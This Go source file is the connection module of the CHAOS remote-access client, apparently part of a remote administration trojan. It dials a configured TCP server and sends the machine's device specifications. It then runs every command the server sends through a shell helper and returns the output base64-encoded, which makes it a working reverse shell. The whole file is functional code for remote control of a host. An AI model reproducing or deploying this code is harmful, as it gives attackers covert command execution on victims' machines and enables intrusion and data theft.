package connection

import (
	"bufio"
	"encoding/base64"
	"encoding/json"
	"fmt"
	log "github.com/sirupsen/logrus"
	"github.com/tiagorlampert/CHAOS/client/app/handler"
	"github.com/tiagorlampert/CHAOS/client/app/models"
	"github.com/tiagorlampert/CHAOS/client/app/util"
	"net"
	"strings"
)

var Delimiter string = "\n"

type ConnectionHandler struct {
	Connection net.Conn
}

func NewConnectionHandler(address, port string) handler.Handler {
	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%s", address, port))
	if err != nil {
		log.Fatal(err)
	}

	return &ConnectionHandler{
		Connection: conn,
	}
}

func (c ConnectionHandler) Handle() error {
	device, err := encode(util.LoadDeviceSpecs())
	if err != nil {
		log.WithField("cause", err.Error()).Error("error encoding device specs")
		return err
	}
	if err := c.Write(string(device)); err != nil {
		log.WithField("cause", err.Error()).Error("error writing device specs")
		return err
	}

	for {
		message, err := bufio.NewReader(c.Connection).ReadString('\n')
		if err != nil {
			log.WithField("cause", err.Error()).Error("error reading from connection")
			continue
		}

		switch strings.TrimSpace(message) {
		default:
			c.WriteCommandResponse(message)
		}
	}
}

func (c ConnectionHandler) WriteCommandResponse(input string) {
	fmt.Print("Message from server: " + input)
	output := util.RunCmd(input, 10)

	outputStr := base64.StdEncoding.EncodeToString(output)
	fmt.Println(outputStr)

	if err := c.Write(outputStr); err != nil {
		log.WithField("cause", err.Error()).Error("error writing command output")
	}
}

func (c ConnectionHandler) Write(v string) error {
	_, err := c.Connection.Write([]byte(v + Delimiter))
	return err
}

func encode(device *models.Device) ([]byte, error) {
	spec, err := json.Marshal(device)
	if err != nil {
		return nil, err
	}
	return spec, nil
}
